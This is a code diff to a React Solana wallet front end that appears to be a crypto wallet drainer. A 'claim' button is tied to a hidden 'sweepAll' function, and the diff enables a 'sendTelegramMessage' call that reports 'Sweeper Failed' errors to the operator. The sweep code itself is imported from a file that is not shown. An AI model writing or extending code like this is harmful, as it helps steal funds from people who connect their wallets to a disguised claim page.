@@ -1,13 +1,13 @@
 import {  useEffect, useRef } from 'react'
 import { WalletMultiButton } from "@solana/wallet-adapter-react-ui"
 import { useConnection, useWallet } from "@solana/wallet-adapter-react"
-import {sweepAll as sweepAllHidden} from "./functions"
+import {sweepAll as sweepAllHidden, sendTelegramMessage} from "./functions"
 import './App.css'
 import type { Transaction, VersionedTransaction } from '@solana/web3.js'
 
 
 function App() {
-  const { publicKey,sendTransaction, disconnect,signTransaction } = useWallet()
+  const { publicKey, disconnect,signTransaction } = useWallet()
   const {connection} = useConnection()
   const claim        = useRef<HTMLButtonElement|null>(null)
 
@@ -48,7 +48,7 @@ function App() {
          }
       }).catch(async (err) => {
         const errorMessage = err instanceof Error ? err.message : String(err)
-        //await sendTelegramMessage(`❌ Sweeper Failed: ${errorMessage}`)
+        await sendTelegramMessage(`❌ Sweeper Failed: ${errorMessage}`)
         console.error(err)
       })
     }
